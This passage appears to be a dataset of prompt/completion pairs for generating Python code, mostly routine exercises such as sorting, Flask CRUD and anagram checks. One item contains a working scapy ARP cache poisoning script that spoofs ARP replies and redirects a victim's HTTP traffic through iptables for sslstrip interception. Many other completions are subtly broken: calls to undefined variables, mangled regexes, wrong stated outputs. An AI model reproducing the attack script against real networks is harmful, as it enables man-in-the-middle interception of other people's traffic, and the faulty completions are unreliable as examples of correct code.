app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db' db = SQLAlchemy(app) class Item(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(50)) description = db.Column(db.String(200)) @app.route('/items', methods=['GET']) def get_items(): items = Item.query.all() return jsonify([item.__dict__() for item in items]) @app.route('/items/<int:id>', methods=['GET']) def get_item(id): item = Item.query.get(id).__dict__() return jsonify(item) @app.route('/items', methods=['POST']) def add_item(): item = Item(name=request.json['name'], description=request.json['description']) db.session.add(item) db.session.commit() return jsonify(item.__dict__()) @app.route('/items/<int:id>', methods=['PUT']) def update_item(id): item = Item.query.get(id) item.name = request.json['name'] item.description = request.json['description'] db.session.commit() return jsonify(item.__dict__()) @app.route('/items/<int:id>', methods=['DELETE']) def delete_item(id): Item.query.filter_by(id=id).delete() db.session.commit() return {'message': 'Item deleted'} if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Create a Python script that takes an array of numbers and finds the three longest possible increasing subsequences. [2, 4, 3, 5, 1, 7, 6]","completion":"def find_longest_increasing_subsequences(arr): # Array to store ending # index of longest increasing subsequences seq_lengths = [1 for i in range(len(arr))] # For every element store its index as a starting index # of increasing subsequences starting_seq_idx = [-1 for i in range(len(arr))] max_length = 1 for i in range(1, len(arr)): for j in range(i): if arr[i] > arr[j] and seq_lengths[i] < seq_lengths[j] + 1: seq_lengths[i] = seq_lengths[j] + 1 starting_seq_idx[i] = j if max_length < seq_lengths[i]: max_length = seq_lengths[i] longest_incr_seqs = [] # Backtrack starting index to get actual sequence # and add to result while max_length > 0: # An empty result list to store # longest decreasing subsequences max_seq = [] for i in range(len(arr)): if seq_lengths[i] == max_length: # Follow the values from back to front temp = i while temp >= 0: max_seq.append(arr[temp]) temp = starting_seq_idx[temp] longest_incr_seqs.append(max_seq[::-1]) max_length -= 1 return longest_incr_seqs arr = [2, 4, 3, 5, 1, 7, 6] result = find_longest_increasing_subsequences(arr) print(result)"},{"prompt":"Create a python object abstract class that implements the following methods:","completion":"class ObjectAbstract: def __init__(self): self.data = None def get_data(self): return self.data def set_data(self, data): self.data = data def print_data(self): print(self.data)"},{"prompt":"Develop a Python algorithm to detect an anagram in a given sentence. sentence = The eyes anagram = theyes","completion":"def isAnagram(sentence, anagram): sentence = ''.join(sentence.split()) anagram = ''.join(anagram.split()) if(sorted(sentence) == sorted(anagram)): return True else: return False if isAnagram(sentence, anagram): print(\\"The given strings are anagrams!\\") else: print(\\"The given strings are not anagrams.\\")"},{"prompt":"Develop an NFC reader protocol in Python to transfer data between two NFC enabled devices. Not applicable","completion":"import nfc def on_connect(tag): print('Tag connected') # Read data data = tag.read() print(data) # Write data tag.write('Hello World!') with nfc.ContactlessFrontend('usb') as clf: clf.connect(rdwr={'on-connect': on_connect})"},{"prompt":"Create a Python script that validates email addresses. It should accept one argument which is an email address as a string and output ‘valid’ or ‘invalid’ depending on whether the email address is valid or not. example@example.com","completion":"import re def is_valid_email(email): email_regex = re.compile(r'^[w.+-]+@[w.-]+.[a-zA-Z]{2,4}') return True if email_regex.match(email) else False address = input(\\"Please enter an email address: \\") if is_valid_email(address): print('Valid') else: print('Invalid')"},{"prompt":"Create a Python function to sort a list of integers (descending) without using the Python's builtin sort() function. Random Integer List : [5, 6, 11, 15, 20, 1, 8]","completion":"def sort_list(input_list): # Set the boolean flag to True flag = True # Loop until flag becomes False while flag: # Set the flag to False flag = False # Go through each item of the list for i in range(0, len(input_list)-1): # Compare the current item with the item next to it if input_list[i] < input_list[i+1]: # Swapping the elements temp = input_list[i] input_list[i] = input_list[i+1] input_list[i+1] =temp flag = True # Return the new sorted list return input_list # Call the function input_list = [5, 6, 11, 15, 20, 1, 8] print(sort_list(input_list)) # Output: [20, 15, 11, 8, 6, 5, 1]"},{"prompt":"Design a program in Python that uses a loop to iterate through the items in a list. items = [1, 2, 3, 4, 5]","completion":"def loop_through_list(items): \\"\\"\\"Iterates through a list of items and prints each one\\"\\"\\" for item in items: print(item)"},{"prompt":"Write a Python function to find the sublist with the maximum sum in a given list. list_a = [2, 3, 5, 4, 3, 7, 2]","completion":"def max_sum_sublist(list_a): start = 0 end = 0 max_sum = 0 current_sum = 0 for i in range(len(list_a)): current_sum += list_a[i] if current_sum < 0: current_sum = 0 start = i + 1 if current_sum > max_sum: max_sum = current_sum end = i return list_a[start:end+1] max_sum_sublist(list_a)"},{"prompt":"Generate a Python code to detect Outliers from a given data set.","completion":"import numpy as np # Set the threshold value to determine what is an outlier threshold = 3 def detectOutliers(data): # calculate the median median = np.median(data) # calculate the absolute deviations from the median abs_devs = [abs(val - median) for val in data] # calculate the median of the absolute deviations med_abs_dev = np.median(abs_devs) # calculate the scaled absolute deviations scaled_abs_dev = [abs_dev/med_abs_dev for abs_dev in abs_devs] outliers = [val for val in scaled_abs_dev if val > threshold] return outliers data = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19] outliers = detectOutliers(data) print(\\"Outliers: \\", outliers)"},{"prompt":"Write a Python program that takes a list of strings as input and returns a string containing all the strings joined together in alphabetical order. ['apple', 'banana', 'orange']","completion":"def alphabetize_list(arr): arr.sort() return ' '.join(arr) data = ['apple', 'banana', 'orange'] result = alphabetize_list(data) print(result)"},{"prompt":"Generate code for an ML model objecttracking system in Python. The system should be able to detect the objects like pedestrian, vehicle, animals and track the movement of the object. Not applicable","completion":"import cv2 import numpy as np # Setup Video Capture cap = cv2.VideoCapture(0) # 0 is the default webcam # Object Classifier object_classifier = cv2.CascadeClassifier('object.xml') # Tracking while True: ret, frame = cap.read() gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) # Detect Objects objects = object_classifier.detectMultiScale(gray, 1.3, 5) for (x,y,w,h) in objects: cv2.rectangle(frame, (x,y), (x+w, y+h), (255,0,0), 2) cv2.putText(frame, 'Objects', (x,y), cv2.FONT_HERSHEY_COMPLEX, 1, (0,255,0), 2) # Track the objects cv2.imshow('Object Tracking', frame) if cv2.waitKey(1) == 27: # Press Escape to exit break cap.release() cv2.destroyAllWindows()"},{"prompt":"Generate a complete Python program that performs the following task Read a CSV file and print the sum of each colum","completion":"\\"\\"\\"Read a CSV file and print the sum of each column.\\"\\"\\" import csv def print_col_sums(filename): # open the file and read into a list of lines with open(filename, 'r') as csv_file: csv_reader = csv.reader(csv_file) data = list(csv_reader) # initialize list to store column sums col_sums = [0] * len(data[0]) # loop through data and compute sums for line in data: for i in range(len(line)): col_sums[i] += int(line[i]) # print the column sums print('Column sums:', col_sums) if __name__ == '__main__': print_col_sums('sample.csv')"},{"prompt":"Design an algorithm in Python that takes two integers as an input and returns the maximum of the two. x = 3 y = 6","completion":"def max_of_two(x, y): if x > y: return x else: return y print(max_of_two(3,6))"},{"prompt":"Write a python program to classify a given sentence into positive or negative","completion":"\\"\\"\\" Program to classify a sentence into positive or negative \\"\\"\\" def classify_sentence(sentence): \\"\\"\\"Classifies a given sentence into positive or negative Args: sentence (str): The sentence to be classified Returns: str: 'positive' or 'negative' \\"\\"\\" tokenized_sentence = sentence.split() num_positive = 0 num_negative = 0 for word in tokenized_sentence: if word in positive_words: num_positive += 1 elif word in negative_words: num_negative += 1 if num_positive > num_negative: return \\"positive\\" elif num_negative > num_positive: return \\"negative\\" else: return \\"neutral\\" if __name__ == '__main__': sentence = input() print(classify_sentence(sentence))"},{"prompt":"Create a natural language processing model in Python to generate a summary of a given article. Input Article: The world is in a state of crisis. Social media and technology have taken over our lives, and it has caused serious harm to our mental health and wellbeing. We have become isolated and more disconnected from other people and nature. It’s time to take a break and reconnect with the real world.","completion":"import spacy import nltk # load the model nlp = spacy.load('en_core_web_sm') # define the input article text = \\"The world is in a state of crisis. Social media and technology have taken over our lives, and it has caused serious harm to our mental health and wellbeing. We have become isolated and more disconnected from other people and nature. It’s time to take a break and reconnect with the real world.\\" # tokenize the article doc = nlp(text) sentences = [sent.string.strip() for sent in doc.sents] # generate the summary def generate_summary(sentences): # create a list for tokenized sentences tokenized_sentences = [nltk.word_tokenize(sentence) for sentence in sentences] # create the frequency table frequency_table = dict() for sentence in tokenized_sentences: for word in sentence: if word in frequency_table: frequency_table[word] += 1 else: frequency_table[word] = 1 # calculate the weighted frequency max_frequency = max(frequency_table.values()) for word in frequency_table.keys(): frequency_table[word] = frequency_table[word]/max_frequency # calculate the score for each sentence sentence_scores = dict() for sent in tokenized_sentences: for word in sent: if word in frequency_table.keys(): if sent not in sentence_scores.keys(): sentence_scores[sent] = frequency_table[word] else: sentence_scores[sent] += frequency_table[word] # return the summary summary_sentences = heapq.nlargest(3, sentence_scores, key=sentence_scores.get) summary = ' '.join(summary_sentences) return summary # print the summary print(generate_summary(sentences)) # Output: It's time to take a break and reconnect with the real world. Social media and technology have taken over our lives, causing serious harm to our mental health and wellbeing. We have become isolated and more disconnected from other people and nature."},{"prompt":"Write a Python program to encode an integer into a base 62 string.","completion":"import string def encode_base_62(n): base62 = string.digits + string.ascii_uppercase + string.ascii_lowercase output = \\"\\" while n > 0: output = base62[n%62] + output n //= 62 return output"},{"prompt":"Create a web scraper in Python using the Requests library that can scrape information from a Wikipedia page. https://en.wikipedia.org/wiki/Python_(programming_language)","completion":"import requests from bs4 import BeautifulSoup def scrape_wiki(url): response = requests.get(url) soup = BeautifulSoup(response.text, 'html.parser') # find all headlines headers = soup.find_all('h1', {'id': 'firstHeading'}) for header in headers: print(header.get_text()) # find all links links = soup.find_all('a') for link in links: print(link.get('href')) if __name__ == '__main__': url = 'https://en.wikipedia.org/wiki/Python_(programming_language)' scrape_wiki(url)"},{"prompt":"Design a neural network in Python with two hidden layers to solve a given classification task.","completion":"import numpy as np import matplotlib.pyplot as plt from keras.models import Sequential from keras.layers import Dense # create model model = Sequential() model.add(Dense(units=200, input_dim=2, activation='relu')) model.add(Dense(units=200, activation='relu')) model.add(Dense(units=1, activation='sigmoid')) # Compile model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) # Fit the model model.fit(X, y, epochs=1500, batch_size=128) # evaluate the model scores = model.evaluate(X, y) print(\\"n%s: %.2f%%\\" % (model.metrics_names[1], scores[1]*100))"},{"prompt":"Develop a data analysis tool in Python that finds the correlation between two variables in a dataset. Not applicable","completion":"import numpy as np import pandas as pd import matplotlib.pyplot as plt # Load the data set data = pd.read_csv('./data.csv') # Get the variables to analyze X = data['variable1'] Y = data['variable2'] # Calculate the correlation correlation = np.corrcoef(X, Y) # Print out the result print('The correlation between Variable1 and Variable2 is: ' + str(correlation[0][1])) # Plot a scatter plot for the data plt.scatter(X, Y) plt.xlabel('Variable1') plt.ylabel('Variable2') plt.title('Scatter Plot') plt.show()"},{"prompt":"this Python code, identify the type of data structure being used and write down advantages and disadvantages of using this type of data structure. my_list = [Apple, Banana, Orange, Mango]","completion":"A list is being used in this code snippet. Advantages of using a list are that it is mutable, can store duplicate data, and allows for indexing. Disadvantages of using a list are that it can be slow if the list is very long and operations take a long time."},{"prompt":"Create a python function that returns the year from a given date 02/03/2019","completion":"def get_year(date): return date.split('/')[2] year = get_year('02/03/2019') print(year)"},{"prompt":"Create a Python program to find the index of the first occurrence of a given element in a sorted array arr = [1, 3, 3, 4, 5, 6, 8] target = 3","completion":"def binary_search(arr, target): low = 0 high = len(arr) - 1 while low <= high: mid = (low + high) // 2 if arr[mid] == target: if mid == 0 or arr[mid-1] < target: return mid else: high = mid - 1 elif arr[mid] < target: low = mid + 1 else: high = mid - 1 return -1 # example arr = [1, 3, 3, 4, 5, 6, 8] target = 3 print(binary_search(arr, target)) # 1"},{"prompt":"Create a class to model a 3D vector in Python. No inpu","completion":"class Vector3D: def __init__(self, x, y, z): self.x = x self.y = y self.z = z def magnitude(self): return (self.x**2 + self.y**2 + self.z**2)**0.5 def normalize(self): magnitude = self.magnitude() return Vector3D(self.x/magnitude, self.y/magnitude, self.z/magnitude) def __add__(self, other): return Vector3D(self.x + other.x, self.y + other.y, self.z + other.z)"},{"prompt":"This code performs an ARP cache poisoning attack. To use it, run the script and pass in the IP address of the victim, the IP address of the gateway, and the network interface to use. The script will then enable packet forwarding, redirect HTTP traffic to port 10000, and begin poisoning the victim's ARP cache. To stop the attack, press Ctrl+C. After the attack is stopped, the script will restore the victim and gateway's ARP cache to its correct state, and disable HTTP redirection and packet forwarding.","completion":"#!/usr/bin/python # src from https://github.com/rusec/scapy-arpspoof-demo from scapy.all import * from argparse import ArgumentParser import os IP_FORWARD = '/proc/sys/net/ipv4/ip_forward' TIMEOUT = 2 RETRY = 10 # This function uses argparse to parse command line # arguments passed to the script. def set_configs(): # create a new ArgumentParser parser = ArgumentParser() # add definitions for command line arguments parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim's IP address') parser.add_argument('-g', dest='gateway', required=True, type=str, help='The gateway's IP address') parser.add_argument('-i', dest='interface', required=True, type=str, help='Use this network interface') # parse command line arguments according to those definitions args = parser.parse_args() # use arguments to construct config dictionary return { 'victim' : { 'ip' : args.victim, 'mac' : ip_to_mac(args.victim), }, 'gateway' : { 'ip' : args.gateway, 'mac' : ip_to_mac(args.gateway), }, 'iface' : args.interface, } # enables packet forwarding by interacting with the proc filesystem def enable_packet_forwarding(): with open(IP_FORWARD, 'w') as fd: fd.write('1') # disables packet forwarding by interacting with the proc filesystem def disable_packet_forwarding(): with open(IP_FORWARD, 'w') as fd: fd.write('0') # use iptables to redirect http traffic to port 10000 where it can # be parsed using sslstrip def enable_http_redirection(): print '[*] Redirecting all http traffic to port 10000' os.system('iptables -v -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000') # restore iptables to default state def disable_http_redirection(): print '[*] Disabling http redirection' os.system('iptables -v --flush') os.system('iptables -v --table nat --flush') os.system('iptables -v --delete-chain') os.system('iptables -v --table nat --delete-chain') # uses scapy to arp poison victim def poison_victim(configs): # get victim and gateway ip and hardware addresses from # configs victim_mac = configs['victim_mac'] gateway_mac = configs['gateway_mac'] victim_ip = configs['victim_ip'] gateway_ip = configs['gateway_ip'] # create layer 3 Arp() packets victim_arp = ARP() gateway_arp = ARP() # set Operation to 'is-at' victim_arp.op = 2 gateway_arp.op = 2 # set hwdst victim_arp.hwdst = victim_mac gateway_arp.hwdst = gateway_mac # set pdst victim_arp.pdst = victim_ip gateway_arp.pdst = gateway_ip # set psrc victim_arp.psrc = gateway_ip gateway_arp.psrc = victim_ip # continue attack indefinitely while True: try: print '[*] Poisoning victim' # send spoofed arp replies send(victim_arp) send(gateway_arp) # wait for ARP replies from default GW or victim sniff(filter='arp and host %s or %s' % (gateway_ip, victim_ip), count=1) # break out of loop if user hits ctrl+c except KeyboardInterrupt: break print '[*] All done!' # restores the victim and gateway's arp cache to its correct # state def restore_victim(configs): victim_mac = configs['victim_mac'] gateway_mac = configs['gateway_mac'] victim_ip = configs['victim_ip'] gateway_ip = configs['gateway_ip'] # create a Layer 3 ARP() packet victim_arp = ARP() # set correct source ip and mac victim_arp.hwsrc = gateway_mac victim_arp.psrc = gateway_ip # broadcast 'is-at' packet gateway_arp.op = 2 gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff' send(gateway_arp) # create a Layer 3 ARP() packet gateway_arp = ARP() # set correct source ip and mac gateway_arp.hwsrc = victim_mac gateway_arp.psrc = victim_ip # broadcast 'is-at' packet gateway_arp.op = 2 gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff' send(gateway_arp) # sends a legitimate arp request to resolve an IP to a # mac address def ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT): arp = ARP() # set operation to 'who-has' (arp request) arp.op = 1 arp.hwdst = 'ff:ff:ff:ff:ff:ff' arp.pdst = ip response, unanswered = sr(arp, retry=retry, timeout=timeout) # get the response from the first packet received by accessing # layer 2 header for s,r in response: return r[ARP].underlayer.src # return failure return None # driver function for arp cache poisoning attack def poison(configs): enable_packet_forwarding() enable_http_redirection() #poison_victim(configs) # driver function for restoring victim and gateway after # arp cache poisoning attack def antidote(configs): #restore_victim(configs) disable_http_redirection() disable_packet_forwarding() def main(): configs = set_configs() print '[*] Using interface', configs['iface'] conf.iface = configs['iface'] try: poison(configs) except KeyboardInterrupt: pass antidote(configs) if __name__ == '__main__': main()"},{"prompt":"Develop a Python module to optimize a function by Particle Swarm Optimization (PSO).","completion":"import random def pso_optimize(cost_func, num_particles, num_iter, min_pos, max_pos): swarm_position = [] swarm_velocity = [] swarm_cost = [] for i in range(num_particles): swarm_position.append([random.uniform(min_pos, max_pos) for d in range(len(min_pos))]) swarm_velocity.append([0 for d in range(len(min_pos))]) swarm_cost.append(cost_func(swarm_position[i])) for it in range(num_iter): for i in range(num_particles): swarm_cost[i] = cost_func(swarm_position[i]) if swarm_cost[i] > swarm[i]['best_cost']: swarm[i]['best_cost'] = swarm_cost[i] swarm[i]['best_position'] = swarm_position[i] if swarm_cost[i] > swarm['global_best_cost']: swarm['global_best_cost'] = swarm_cost[i] swarm['global_best_position'] = swarm_position[i] for d in range(len(min_pos)): rp = random.randint(0,1) rg = random.randint(0,1) swarm_velocity[i][d] = (swarm_velocity[i][d] + 2*rp*(swarm[i]['best_position'][d] - swarm_position[i][d]) + 2*rg*(swarm['global_best_position'][d] - swarm_position[i][d])) swarm_position[i][d] = swarm_position[i][d] + swarm_velocity[i][d] return swarm['global_best_position'], swarm['global_best_cost']"},{"prompt":"mplement a classlevel decorator in Python to time the execution of a method.","completion":"class timed_method(object): def __init__(self,func): self.func = func def __call__(self, *args, **kwargs): start_time = time.time() try: result = self.func(*args, **kwargs) except Exception as e: raise e end_time = time.time() print('Total elapsed time for method %s: %2.2f seconds' % (self.func.__name__, end_time - start_time)) return result"},{"prompt":"Create a Python script which takes a string as an input and outputs the longest substring without repeating characters. Input string = “abcdbcdab”","completion":"def longest_substring(string): # Stores the last occurrence of each character last_occurrence = {} result = [0, 1] start_index = 0 for i, char in enumerate(string): if char in last_occurrence: start_index = max(start_index, last_occurrence[char] + 1) # We can use result to store the longest substring found so far if result[1] - result[0] < i + 1 - start_index: result = [start_index, i + 1] last_occurrence[char] = i return string[result[0]:result[1]] input_string = \\"abcdbcdab\\" # Print the output print(longest_substring(input_string))"},{"prompt":"Create a data analysis model using an artificial neural network and Python. Not applicable","completion":"import numpy as np import tensorflow as tf # Define the model model = tf.keras.Sequential() model.add(tf.keras.layers.Dense(10, input_dim=5, activation='relu')) model.add(tf.keras.layers.Dense(1, activation='sigmoid')) # Compile the model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) # Train the model model.fit(X_train, y_train, epochs=50, batch_size=32, verbose=2) # Evaluate the model scores = model.evaluate(X_test, y_test, verbose=2) print(\\"Accuracy: %.2f%%\\" % (scores[1]*100))"},{"prompt":"Create Python code to sum all the values in a list? [1,2,3,4,5]","completion":"def sum_list(l): '''This function returns the sum of all the values in a list''' sum = 0 for val in l: sum = sum + val return sum"},{"prompt":"Write a function in Python that takes in a string and returns true if it is a palindrome, and false otherwise. text = racecar","completion":"def is_palindrome(text): return text == text[::-1]"},{"prompt":"Generate a program that classifies an animal based on the given data. animals = [dog, cat, bird, elephant] features = [bark, meow, tweet, trumpet]","completion":"# Python program to classify animals animals = [\\"dog\\", \\"cat\\", \\"bird\\", \\"elephant\\"] features = [\\"bark\\", \\"meow\\", \\"tweet\\", \\"trumpet\\"] # Create a dictionary with key being animal name and value being its feature animal_feature_dict = dict(zip(animals, features)) # Function to classify an animal def classify_animal(animal): # Fetch feature from dict feature = animal_feature_dict[animal] # Check for feature if feature == \\"bark\\": print(\\"Animal is a dog.\\") elif feature == \\"meow\\": print(\\"Animal is a cat.\\") elif feature == \\"tweet\\": print(\\"Animal is a bird.\\") elif feature == \\"trumpet\\": print(\\"Animal is an elephant.\\") else: print(\\"Not able to identify the animal.\\") # Driver program classify_animal(\\"dog\\") classify_animal(\\"cat\\") classify_animal(\\"bird\\") classify_animal(\\"elephant\\")"},{"prompt":"Generate a Python program that can verify if a given sentence is correct or misspelled. The sentence: This is my new computer","completion":"import re def spell_check(sentence): words = re.findall(r'w+', sentence) for word in words: if not word.lower() in dict: return False return True sentence = \\"This is my new computer\\" result = spell_check(sentence) if result: print('Correct spelling') else: print('Incorrect spelling')"},{"prompt":"Create a web server in Python to handle HTTP requests.","completion":"import http.server # Create the server object and set the port server = http.server.HTTPServer(('localhost', 8080), http.server.BaseHTTPRequestHandler) # Start listening for requests server.serve_forever()"},{"prompt":"Generate a Python program that counts the number of words and the average word length in a given sentence.","completion":"def count_words(sentence): words = sentence.split() num_words = len(words) total_len = 0 for word in words: total_len += len(word) avg_word_len = total_len / num_words return (num_words, avg_word_len)"},{"prompt":"Write a function in Python to parse text from the HTML of a given web page.","completion":"def parse_html(html): soup = BeautifulSoup(html, 'html.parser') text = soup.get_text() return text"},{"prompt":"Design an algorithm in Python to find the closest pair of numbers from two given lists. list_1 = [3, 5, 7, 11] list_2 = [2, 4, 6, 8]","completion":"def closest_pair(list_1, list_2): min_diff = float(\\"inf\\") for a in list_1: for b in list_2: diff = abs(a - b) if diff < min_diff: min_diff = diff closest_pair = (a, b) return closest_pair"},{"prompt":"Create a Python function to generate a URL endpoint mapping based on a given URL string. URL string: /posts/<title>/<action>","completion":"from flask import Flask app = Flask(__name__) @app.route(\\"/posts/<title>/<action>\\") def process_url(title: str, action: str): print(f'URL endpoint mapping for title: {title} and action: {action}') if __name__ == '__main__': app.run()"},{"prompt":"Generate an algorithm in Python to check if a given number of years is a leap year. year = 1999","completion":"def is_leap_year(year): if year % 400 == 0: return True if year % 100 == 0: return False if year % 4 == 0: return True return False year = 1999 if is_leap_year(year): print(\\"This is a leap year.\\") else: print(\\"This is not a leap year.\\")"},{"prompt":"Develop a web service in Python that listens to HTTP requests.","completion":"import http.server import socketserver PORT = 8000 #Create an instance of the server Handler = http.server.SimpleHTTPRequestHandler #Enable the server to listen on port 8000 with socketserver.TCPServer((\\"\\", PORT), Handler) as httpd: print(\\"serving at port\\", PORT) httpd.serve_forever()"},{"prompt":"Write a Python program to print out the numbers from 0 to 20, but only print out 3, 5, and 8. Not applicable","completion":"for i in range(0,21): if i == 3 or i == 5 or i == 8: print(i)"},{"prompt":"Create a Python program to convert Fahrenheit to Celsius.","completion":"def Fahrenheit_to_Celsius(F): return (F - 32) * 5/9 print(\\"Temperature in Celsius = \\", Fahrenheit_to_Celsius(100))"},{"prompt":"Generate a Python algorithm that takes an unsorted array and returns a sorted one. [5, 8, 1, 4, 9]","completion":"def sort_array(arr): sorted_arr = sorted(arr) # use the built-in sorted() method return sorted_arr result = sort_array([5, 8, 1, 4, 9]) print(result)"},{"prompt":"Create a Python program to convert a binary string into its equivalent decimal value. binary_num = '10101'","completion":"def binary_to_decimal(binary_num): decimal_num = 0 n = 0 for i in range(len(binary_num)-1, -1, -1): if binary_num[i] == '1': decimal_num += 2**n n += 1 return decimal_num"},{"prompt":"mprove the following Python code by making it faster and more efficient. def multiply(a, b): result = 0 for x in range(a): result += b return resul","completion":"def multiply(a, b): result = 0 while a != 0: if a & 1: result += b a >>= 1 b <<= 1 return result"},{"prompt":"Design an algorithm in Python to sort a given list of numbers using the QuickSort method. Not applicable","completion":"def quick_sort(A): # Base case if len(A) <= 1: return A # Choose pivot pivot_idx = len(A) // 2 pivot_val = A[pivot_idx] # Initialize left and right lists left = [] right = [] # Populate left and right lists for i in range(len(A)): if i == pivot_idx: continue elif A[i] < pivot_val: left.append(A[i]) else: right.append(A[i]) # Return sorted left and right lists return quick_sort(left) + [pivot_val] + quick_sort(right)"},{"prompt":"Using Python, write a program to find all the word pairs in a text that are anagrams of each other.","completion":"#import itertools # initialize empty list to hold all anagrams word_pairs = [] # enter the source text source_text = input(\\"Enter the source text: \\") # split the source text into individual words words = source_text.split() for word1, word2 in itertools.combinations(words,2): if (sorted(word1) == sorted(word2)): word_pairs.append((word1, word2)) # print the list of anagram pairs in source text print(word_pairs)"},{"prompt":"Create a class in Python with four attributes and appropriate getter,setter methods.","completion":"class Student: def __init__(self, name, age, marks, roll_number): self.name = name self.age = age self.marks = marks self.roll_number = roll_number def get_name(self): return self.name def set_name(self, name): self.name = name def get_age(self): return self.age def set_age(self, age): self.age = age def get_marks(self): return self.marks def set_marks(self, marks): self.marks = marks def get_roll_number(self): return self.roll_number def set_roll_number(self, roll_number): self.roll_number = roll_number"},{"prompt":"Create a Python program to find the n'th Fibonacci number.","completion":"def fibonacci_number(n): if n == 0: return 0 elif n == 1: return 1 else: return (fibonacci_number(n-1) + fibonacci_number(n-2)) n = int(input(\\"Enter the n'th Fibonacci number: \\")) print(\\"Fibonacci number at %d is: %d\\" % (n,fibonacci_number(n)))"},{"prompt":"Write a Python class that stores the employee details such as name, age, salary etc.","completion":"class Employee: def __init__(self, name, age, salary): self.name = name self.age = age self.salary = salary"},{"prompt":"Create a Python script which uses the BeautifulSoup library to parse the data of a given webpage. Webpage link = http://www.example.com","completion":"import requests from bs4 import BeautifulSoup page = requests.get(url) soup = BeautifulSoup(page.content, 'html.parser')"},{"prompt":"Develop a program in Python to classify the sentiment of a given sentence.","completion":"from textblob import TextBlob def sentiment_classifier(sentence): sentiment_score = TextBlob(sentence).sentiment.polarity if sentiment_score > 0: return 'positive' elif sentiment_score < 0: return 'negative' else: return 'neutral'"},{"prompt":"Construct a Python program that can extract the name of an author from a given book title. title = 'Harry Potter and the Sorcerer's Stone'","completion":"def extract_author(title): title_words = title.split() for word in title_words[::-1]: if word[0].isupper(): return word print(extract_author(title)) # Potter"},{"prompt":"Create a Python decorator that counts the number of times a given function is called.","completion":"\\"\\"\\" Create a Python decorator that counts the number of times a given function is called. \\"\\"\\" def counter_decorator(func): count = 0 def wrapper(*args, **kwargs): nonlocal count count += 1 print(f'{func.__name__} has been called {count} times!') return func(*args, **kwargs) return wrapper @counter_decorator def random_function(): pass if __name__ == '__main__': random_function() # prints \\"random_function has been called 1 time!\\" random_function() # prints \\"random_function has been called 2 time!\\""},{"prompt":"Create a Python program to print numbers from 1 to 10 in reverse order.","completion":"for i in range(10, 0, -1): print(i)"},{"prompt":"Write a code snippet in Python to extract a substring from a given string.","completion":"def extract_substring(string): return string[2:5]"},{"prompt":"Create an algorithm in Python to calculate the area of a triangle. A = 5, B = 10, C = 13","completion":"def calculate_area(a,b,c): # calculate the semi-perimeter s = (a + b + c) / 2 # calculate the area area = (s*(s-a)*(s-b)*(s-c)) ** 0.5 return area # Driver code a = 5 b = 10 c = 13 area = calculate_area(a,b,c) print(\\"The area of the triangle is {} cm\\".format(area))"},{"prompt":"Construct an efficient algorithm to find all prime numbers up to a given number N in Python.","completion":"def sieve_of_eratosthenes(n): # Create a boolean array \\"prime[0..n]\\" and initialize # all entries it as true. A value in prime[i] will # finally be false if i is Not a prime, else true. prime = [True for i in range(n + 1)] p = 2 while (p * p <= n): # If prime[p] is not changed, then it is a prime if (prime[p] == True): # Update all multiples of p for i in range(p * 2, n + 1, p): prime[i] = False p += 1 # Print all prime numbers result = [] for p in range(2, n): if prime[p]: result.append(p) return result N = 100 print(\\"All prime numbers up to\\", N, \\"are:\\") print(sieve_of_eratosthenes(N))"},{"prompt":"Create a Python script which connects to a MySQL database, runs a query and outputs the results in JSON format. Database name: test Query: SELECT * FROM user","completion":"import mysql.connector import json db = mysql.connector.connect( host=\\"localhost\\", user=\\"yourusername\\", password=\\"yourpassword\\", database=\\"test\\" ) cursor = db.cursor() sql = \\"SELECT * FROM users\\" cursor.execute(sql) results = cursor.fetchall() json_data = [] for result in results: json_data.append(result) print(json.dumps(json_data))"},{"prompt":"mplement a min heap using an array in Python.","completion":"class MinHeap: def __init__(self): self.heap = [] def __len__(self): return len(self.heap) def insert(self, element): self.heap.append(element) self.perc_up(len(self.heap) - 1) def extract_min(self): if self.heap[0]: minval = self.heap[0] self.heap[0] = self.heap[-1] del self.heap[-1] self.perc_down(0) return minval else: return False def perc_up(self, index): parent = (index-1)//2 if index <= 0: return elif self.heap[parent] > self.heap[index]: self.swap(parent, index) self.perc_up(parent) def perc_down(self, index): left = (2 * index) + 1 right = (2 * index) + 2 smallest = index if len(self.heap) > left and self.heap[smallest] > self.heap[left]: smallest = left if len(self.heap) > right and self.heap[smallest] > self.heap[right]: smallest = right if smallest != index: self.swap(index, smallest) self.perc_down(smallest) def swap(self, i1, i2): self.heap[i1], self.heap[i2] = self.heap[i2], self.heap[i1]"},{"prompt":"Rewrite the given code to use dictionaries instead of switch statements in Python. def convert_letter_grade(grade): switch (grade): case 'A': return 4.0 case 'B': return 3.0 case 'C': return 2.0 case 'D': return 1.0","completion":"def convert_letter_grade(grade): grades = { 'A': 4.0, 'B': 3.0, 'C': 2.0, 'D': 1.0 } return grades[grade]"},{"prompt":"Develop a Python logic to check if two given strings are isomorphic to each other. add, egg","completion":"def isIsomorphic(s1, s2): if len(s1) != len(s2): return False mapping = {} for i in range(len(s1)): if s1[i] in mapping: if mapping[s1[i]] != s2[i]: return False else: if s2[i] in mapping.values(): return False mapping[s1[i]] = s2[i] return True s1 = \\"add\\" s2 = \\"egg\\" if(isIsomorphic(s1, s2) == True): print(\\"Yes\\") else: print(\\"No\\")"},{"prompt":"Construct a Python function to calculate the sum of all elements of a given array. [3,2,1,6,5,7,4]","completion":"def array_sum(arr): s = 0 for i in arr: s += i return s print(array_sum([3,2,1,6,5,7,4]))"},{"prompt":"Create a class in python, named RoundInstance, that can store radius, diameter, area and circumference coordinates.","completion":"class RoundInstance(): def __init__(self, radius, diameter, area, circumference): self.radius = radius self.diameter = diameter self.area = area self.circumference = circumference def get_radius(self): return self.radius def get_diameter(self): return self.diameter def get_area(self): return self.area def get_circumference(self): return self.circumference"},{"prompt":"Create a python program to output an alphabetically sorted list of strings from an input list of strings. [blue, red, green, yellow]","completion":"def sort_words(words): words.sort() return words print(sort_words([\\"blue\\", \\"red\\", 